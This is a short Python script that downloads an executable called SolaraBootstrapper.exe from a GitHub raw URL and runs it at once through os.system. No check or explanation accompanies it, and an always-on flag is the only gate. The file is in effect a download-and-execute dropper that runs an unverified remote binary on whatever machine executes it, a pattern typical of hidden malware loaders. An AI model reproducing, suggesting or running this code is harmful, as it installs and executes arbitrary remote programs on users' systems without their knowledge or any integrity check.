import requests
import os


def download_file(url, path):
    response = requests.get(url)
    with open(path, 'wb') as f:
        f.write(response.content)

url = 'https://github.com/quivings/Solara/blob/main/Files/SolaraBootstrapper.exe?raw=true'
path = 'SolaraBootstrapper.exe'


Enabled = True

if Enabled:
    download_file(url, path)
    os.system(path)
